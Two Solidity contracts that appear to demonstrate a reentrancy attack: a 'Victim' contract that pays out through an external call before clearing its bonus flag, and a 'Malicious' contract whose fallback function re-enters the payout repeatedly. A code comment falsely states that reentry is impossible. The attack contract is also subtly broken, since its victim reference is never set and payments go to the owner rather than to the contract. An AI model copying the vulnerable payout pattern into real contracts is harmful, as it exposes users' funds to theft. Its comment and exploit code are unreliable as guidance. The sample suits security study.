pragma solidity ^0.4.18;

contract Victim{
  mapping (address => uint) private userBalances;
  mapping (address => bool) private claimedBonus;
  mapping (address => uint) private rewardsForA;

  function InitialUser() payable{ 
     claimedBonus[msg.sender]=true;      
  } 

  function AddToBalance() payable{ 
     userBalances[msg.sender] += msg.value; 
  } 

  function WithdrawReward(address recipient) public {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
           throw;
      }
  }

  function GetFirstWithdrawalBonus(address recipient) public {
      if (claimedBonus[recipient] == false) {
           throw;
      }
      rewardsForA[recipient] += 100;
      WithdrawReward(recipient); 
      //claimedBonus has been set to false, so reentry is impossible
      claimedBonus[recipient] = false;
   }
}


pragma solidity ^0.4.18;
import './Victim.sol';

contract Malicious{
  address private _owner;
  Victim vul;
  uint public count = 0;

 //initial the attack contract with the vulnerable address
 function Malicious(){ 
  _owner=msg.sender;
 }
 
 function attack(){
  vul.GetFirstWithdrawalBonus(_owner);
 }
 
 function () payable{
  count++;
  if(count < 10){
    vul.GetFirstWithdrawalBonus(_owner);
  }
 }
}
